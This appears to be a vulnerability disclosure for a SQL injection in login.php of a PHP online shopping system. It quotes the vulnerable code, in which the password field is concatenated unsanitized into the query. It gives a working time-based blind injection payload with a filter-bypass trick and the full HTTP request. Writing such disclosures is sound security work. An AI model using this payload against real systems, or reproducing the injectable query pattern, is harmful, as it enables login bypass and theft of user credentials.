## ONLINE SHOPPING SYSTEM login.php SQL Injection Vulnerability

### I. Vulnerability Impact

An attacker can exploit this vulnerability to bypass login authentication and log in as any user. Additionally, time-based blind SQL injection can be used to extract plaintext passwords from the `user_info` table and admin password hashes from the `admin_info` table, leading to sensitive data leakage.

### II. Source Code Analysis

The vulnerability resides in `login.php`, lines 9-12:

```php
$email = mysqli_real_escape_string($con, $_POST["email"]);
$password = $_POST["password"];
$sql = "SELECT * FROM user_info WHERE email = '$email' AND password = '$password'";
$run_query = mysqli_query($con, $sql);
```

The `email` parameter is sanitized via `mysqli_real_escape_string()`, but the `password` parameter is taken directly from `$_POST["password"]` without any filtering and concatenated into the SQL statement. An attacker can inject malicious SQL fragments through the password field to manipulate the query logic. Moreover, passwords in the `user_info` table are stored in plaintext, allowing an attacker to read all user credentials without cracking.

### III. Payload

The core injection payload is:

```
346778'and(select*from(select+sleep(10))a/**/union/**/select+1)='
```

Here, `346778'` closes the original string single quote, `and` appends a boolean condition, the nested `sleep(10)` triggers a MySQL delay to verify the injection, `/**/` replaces spaces to bypass filtering, and the trailing `='` closes the SQL statement to make the syntax valid. After injection, the actual executed SQL becomes:

```sql
SELECT * FROM user_info WHERE email = '111@qq.com' AND password = '346778'and(select*from(select+sleep(10))a/**/union/**/select+1)=''
```

HTTP request body:

```
POST /login.php HTTP/1.1
Host: onlineshop
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

email=111%40qq.com&password=346778'and(select*from(select+sleep(10))a/**/union/**/select+1)='
```

A server response delay exceeding 10 seconds confirms the vulnerability.

### IV. Source Download

https://code-projects.org/online-shopping-system-in-php-with-source-code/

![image-20260627102334074](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20260627102334074.png)